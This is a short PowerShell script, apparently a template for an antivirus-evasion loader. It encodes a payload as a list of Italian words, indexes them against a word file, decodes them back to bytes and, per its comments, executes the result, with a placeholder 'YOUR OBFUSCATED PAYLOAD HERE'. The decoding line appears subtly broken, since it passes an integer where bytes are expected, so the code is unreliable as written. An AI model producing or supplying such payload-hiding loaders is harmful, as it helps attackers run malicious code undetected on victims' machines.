param (
    [string]$wordFile
)
if (-not $wordFile) {
    Write-Host "Usage: LowEntropyDeobfuscator.ps1 -wordFile <path>"
    exit
}
# read unique words from file
$uniqueWords = $(Get-Content $wordFile | Sort-Object | Get-Unique | Select-Object -First 256)
# create an empty list
$wordList = @()
# add each word to the list
foreach ($word in $uniqueWords) {
    $wordList += $word
}
# obfuscated list
# YOUR OBFUSCATED PAYLOAD HERE
$obfuscated =@("avvicinare","battaglia","bestia","bambino","bestia","azione","avvicinare","battere","avvocato","biondo","badare","badare","baciare","bere")
# convert each byte into a word
$output = ""
foreach ($element in $obfuscated) {
    $index = $wordList.IndexOf($element)
    $output += [System.Text.Encoding]::UTF8.GetString($index)
}
# execute the result
$output
